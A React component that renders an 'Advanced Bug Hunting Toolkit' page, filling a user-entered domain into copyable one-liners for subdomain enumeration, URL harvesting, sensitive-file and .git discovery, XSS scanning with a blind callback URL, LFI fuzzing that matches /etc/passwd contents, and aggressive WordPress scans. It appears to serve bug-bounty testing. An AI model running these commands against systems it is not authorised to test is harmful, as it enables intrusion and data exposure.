
'use client'

import React, { useState, useEffect } from 'react'

export const BugHuntingToolkit = () => {
  const [domain, setDomain] = useState('example.com')
  const [notification, setNotification] = useState('')
  const [showNotification, setShowNotification] = useState(false)

  // Store original commands as templates
  const commandTemplates = {
    'subfinder-basic': 'subfinder -d example.com -all -recursive > subdomain.txt',
    'httpx-filter': 'cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt',
    'subzy-check': 'subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl',
    'katana-passive': 'katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt',
    'advanced-urls': 'echo example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txt\nkatana -u https://example.com -d 5 | grep \'=\' | urldedupe | anew output.txt\ncat output.txt | sed \'s/=.*/=/\' >final.txt',
    'gau-urls': 'echo example.com | gau --mc 200 | urldedupe >urls.txt\ncat urls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep \'=\' | sort > output.txt\ncat output.txt | sed \'s/=.*/=/\' >final.txt',
    'sensitive-files': 'cat allurls.txt | grep -E "\\.xls|\\.xml|\\.xlsx|\\.json|\\.pdf|\\.sql|\\.doc|\\.docx|\\.pptx|\\.txt|\\.zip|\\.tar\\.gz|\\.tgz|\\.bak|\\.7z|\\.rar|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.gz|\\.config|\\.csv|\\.yaml|\\.md|\\.md5"',
    'info-dork': 'site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)',
    'git-detection': 'cat domains.txt | grep "SUCCESS" | gf urls | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe',
    'xss-pipeline': 'echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt',
    'dalfox-xss': 'cat xss_params.txt | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence',
    'lfi-method': 'echo "https://example.com/" | gau | gf lfi | uro | sed \'s/=.*/=/\' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\\*|\\$[^\\:]*):0:0:" -v',
    'cors-check': 'curl -H "Origin: http://example.com" -I https://example.com/wp-json/',
    'wpscan': 'wpscan --url https://example.com --disable-tls-checks --api-token YOUR_TOKEN -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force'
  }

  const [commands, setCommands] = useState(commandTemplates)

  const updateCommands = (newDomain: string) => {
    const updatedCommands = {}
    for (const [id, template] of Object.entries(commandTemplates)) {
      updatedCommands[id] = template
        .replace(/example\.com/g, newDomain)
        .replace(/site\.com/g, newDomain)
        .replace(/target\.com/g, newDomain)
    }
    setCommands(updatedCommands)
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (domain.trim()) {
      updateCommands(domain.trim())
      showNotificationMessage(`Commands updated for: ${domain}`)
    }
  }

  const copyCommand = async (commandText: string) => {
    try {
      await navigator.clipboard.writeText(commandText)
      showNotificationMessage('Command copied to clipboard!')
    } catch (err) {
      showNotificationMessage('Failed to copy command', true)
    }
  }

  const showNotificationMessage = (message: string, isError = false) => {
    setNotification(message)
    setShowNotification(true)
    setTimeout(() => setShowNotification(false), 2000)
  }

  useEffect(() => {
    updateCommands('example.com')
  }, [])

  const ToolCard = ({ title, description, commandId, multiline = false }: {
    title: string
    description: string
    commandId: string
    multiline?: boolean
  }) => (
    <div className="border border-border rounded-lg p-4 bg-card hover:bg-accent/50 transition-colors">
      <div className="flex items-start justify-between mb-2">
        <h3 className="font-semibold text-lg">{title}</h3>
        <button
          onClick={() => copyCommand(commands[commandId])}
          className="p-2 hover:bg-accent rounded transition-colors"
          aria-label="Copy command"
        >
          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
          </svg>
        </button>
      </div>
      <p className="text-sm text-muted-foreground mb-3">{description}</p>
      <div className="bg-muted rounded p-3 font-mono text-sm">
        <span className="text-green-400">$ </span>
        <span className={multiline ? "whitespace-pre-line" : ""}>{commands[commandId]}</span>
      </div>
    </div>
  )

  return (
    <div className="w-full">
      {/* Header Section */}
      <div className="text-center mb-8">
        <h2 className="text-3xl font-bold mb-4">Advanced Bug Hunting Toolkit</h2>
        <form onSubmit={handleSubmit} className="flex gap-2 max-w-md mx-auto">
          <input
            type="text"
            value={domain}
            onChange={(e) => setDomain(e.target.value)}
            placeholder="example.com"
            className="flex-1 px-3 py-2 border border-border rounded-md bg-background"
            required
          />
          <button
            type="submit"
            className="px-4 py-2 bg-primary text-primary-foreground rounded-md hover:bg-primary/90 transition-colors"
          >
            Generate
          </button>
        </form>
        <p className="text-sm text-muted-foreground mt-2">Enter a domain to generate all oneliners commands</p>
      </div>

      {/* Notification */}
      {showNotification && (
        <div className="fixed top-4 right-4 bg-primary text-primary-foreground px-4 py-2 rounded-md shadow-lg z-50">
          {notification}
        </div>
      )}

      {/* Subdomain Enumeration */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10" />
          </svg>
          Subdomain Enumeration
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="Basic Subdomain Discovery"
            description="Discovers subdomains using subfinder with recursive enumeration and saves results to a file."
            commandId="subfinder-basic"
          />
          <ToolCard
            title="Live Subdomain Filtering"
            description="Filters discovered subdomains using httpx and saves the alive ones to a file."
            commandId="httpx-filter"
          />
          <ToolCard
            title="Subdomain Takeover Check"
            description="Checks for subdomain takeover vulnerabilities using subzy."
            commandId="subzy-check"
          />
        </div>
      </section>

      {/* URL Collection */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
          </svg>
          URL Collection
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="Passive URL Collection"
            description="Collects URLs from various sources and saves them to a file."
            commandId="katana-passive"
          />
          <ToolCard
            title="Advanced URL Fetching"
            description="Collects URLs from various sources using multiple techniques."
            commandId="advanced-urls"
            multiline
          />
          <ToolCard
            title="GAU URL Collection"
            description="Collects URLs using GAU and saves them to a file."
            commandId="gau-urls"
            multiline
          />
        </div>
      </section>

      {/* Sensitive Data Discovery */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
          </svg>
          Sensitive Data Discovery
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="Sensitive File Detection"
            description="Detects sensitive files on the web server."
            commandId="sensitive-files"
          />
          <ToolCard
            title="Information Disclosure Dork"
            description="Searches for information disclosure vulnerabilities using a dork."
            commandId="info-dork"
          />
          <ToolCard
            title="Git Repository Detection"
            description="Detects Git repositories on the web server."
            commandId="git-detection"
          />
        </div>
      </section>

      {/* XSS Testing */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4" />
          </svg>
          XSS Testing
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="XSS Hunting Pipeline"
            description="Collects XSS vulnerabilities using various tools and saves them to a file."
            commandId="xss-pipeline"
          />
          <ToolCard
            title="XSS with Dalfox"
            description="Uses Dalfox to scan for XSS vulnerabilities."
            commandId="dalfox-xss"
          />
        </div>
      </section>

      {/* LFI Testing */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
          </svg>
          LFI Testing
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="LFI Methodology"
            description="Tests for Local File Inclusion (LFI) vulnerabilities using various methods."
            commandId="lfi-method"
          />
        </div>
      </section>

      {/* CORS Testing */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M15 20.488V18a2 2 0 012-2h3.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
          </svg>
          CORS Testing
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="Basic CORS Check"
            description="Checks the Cross-Origin Resource Sharing (CORS) policy of a website."
            commandId="cors-check"
          />
        </div>
      </section>

      {/* WordPress Scanning */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" />
          </svg>
          WordPress Scanning
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="Aggressive WordPress Scan"
            description="Scans a WordPress website for vulnerabilities and saves the results to a file."
            commandId="wpscan"
          />
        </div>
      </section>

      {/* Footer */}
      <footer className="text-center py-8 border-t border-border">
        <p className="text-muted-foreground">
          Advanced Bug Hunting Toolkit - Your companion for security testing and vulnerability research
        </p>
      </footer>
    </div>
  )
}
